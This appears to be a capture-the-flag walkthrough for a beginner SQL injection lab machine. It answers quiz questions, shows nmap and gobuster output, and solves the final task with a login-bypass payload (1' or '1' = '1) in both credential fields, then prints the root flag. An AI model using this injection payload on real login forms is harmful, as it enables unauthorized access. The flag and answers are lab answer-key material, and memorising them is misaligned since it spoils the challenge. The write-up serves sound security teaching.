## Task 1: What does the acronym SQL stand for?

Structured Query Language

## Task 2: What is one of the most common type of SQL vulnerabilities

SQL Injection

## Task 3: What does PII stand for?

Personally Identifiable Information

Personal Identifiable Information (PII) is defined as: Any representation of information that permits the identity of an individual to whom the information applies to be reasonably inferred by either direct or indirect means.

## Task 4: What does the OWASP Top 10 list name the classification for this vulnerability?

A03:2021-Injection

## Task 5: What service and version are running on port 80 of the target?

Apache httpd 2.4.38 ((Debian))

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 80 10.129.209.39           
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-16 05:59 EDT

80/tcp open  http    Apache httpd 2.4.38 ((Debian))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

## Task 6: What is the standard port used for the HTTPS protocol?

443

## Task 7: What is one luck-based method of exploiting login pages?

brute-forcing

## Task 8: What is a folder called in web-application terminology?

directory

## Task 9: What response code is given for "Not Found" errors?

404

## Task 10: What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?

answer: dir

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster -h
Usage:
  gobuster [command]

Available Commands:
  dir         Uses directory/file enumeration mode
  dns         Uses DNS subdomain enumeration mode
  fuzz        Uses fuzzing mode
  help        Help about any command
  s3          Uses aws bucket enumeration mode
  version     shows the current version
  vhost       Uses VHOST enumeration mode
```

Gobuster is a tool used to brute-force URIs including directories and files as well as DNS subdomains.

## Task 11: What symbol do we use to comment out parts of the code?

depends on the programming language. In this task, the hint length is only 1 so it's probably:

answer: `#`

## Task 12: Submit root flag

flag: `e3d0796d002a446c0e622226f42e9672`

input:

- username = 1' or '1' = '1
- password = 1' or '1' = '1

`SELECT * FROM users WHERE username='' AND password='';`

become:

`SELECT * FROM users WHERE username='1' or '1' = '1' AND password='1' or '1' = '1';`

which is always True.
